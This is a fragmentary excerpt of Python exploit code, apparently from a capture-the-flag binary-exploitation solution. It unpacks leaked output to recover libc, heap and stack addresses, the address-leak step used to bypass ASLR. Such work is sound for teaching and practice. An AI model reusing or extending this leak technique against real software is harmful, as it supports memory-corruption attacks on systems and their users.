...
def extract_pointers(data):
    data_chunk = [elem for elem in data.split(b'\n') if elem != b''][2]
    
    size_qword = struct.calcsize('<Q') # 8 bytes
    aligned_length = len(data_chunk) - (len(data_chunk) % size_qword)
    
    return [a[0] for a in struct.iter_unpack('<Q', data_chunk[:aligned_length]) if a[0] > 0xFFFFFFFF]
...
libc_leak_io_err = leaked_addr[9]
...
leaked_heap_addr = leaked_addr[1]
...
x = p.clean()
leaked_stack_addr = int.from_bytes([elem for elem in x.split(b"\n")[3].split(b"\x00") if elem != b''][0], "little")
